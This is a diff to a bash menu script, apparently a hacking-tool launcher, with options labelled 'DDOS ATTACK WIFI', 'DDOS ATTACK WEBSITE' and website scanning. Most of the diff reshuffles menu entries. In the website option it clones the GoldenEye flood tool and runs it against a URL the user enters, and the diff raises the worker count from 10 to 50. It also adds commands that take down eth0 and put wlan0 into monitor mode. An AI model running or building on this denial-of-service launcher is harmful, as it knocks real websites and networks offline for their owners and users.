@@ -28,7 +28,9 @@ echo "$5[5]─>>DDOS ATTACK WIFI" | lolcat
 echo "$6[6]─>>DDOS ATTACK WEBSITE" | lolcat
 echo "$7[7]─>>SCANNING WEBSITE ADDRESS" | lolcat
 echo "$8[8]─>>" | lolcat
-echo "$9[9]─>>EXIT" | lolcat
+echo "$a[a]─>>" | lolcat
+echo "$b[b]─>>" | lolcat
+echo "$z[z]─>>EXIT" | lolcat
 echo "**********************************************************************************"
 echo "╭─[MrXonee@root]" | lolcat
 read -p"╰─>> " pil
@@ -160,9 +162,11 @@ sleep 5
 git clone https://github.com/jseidl/GoldenEye
 cd GoldenEye
 chmod +x goldeneye.py
+ifconfig eth0 down
+airmon-ng start wlan0
 echo "╭─[Masukan URL Website]" | lolcat
 read -p"╰─>> " url
-./goldeneye.py $url -w 10 -d
+./goldeneye.py $url -w 50 -d
 fi
 
 if [ $pil = 7 ]
@@ -197,7 +201,7 @@ echo "##########################################################################
 sleep 5
 fi
 
-if [ $pil = 9 ]
+if [ $pil = z ]
 then
 echo $i"Openning..."
 sleep 2
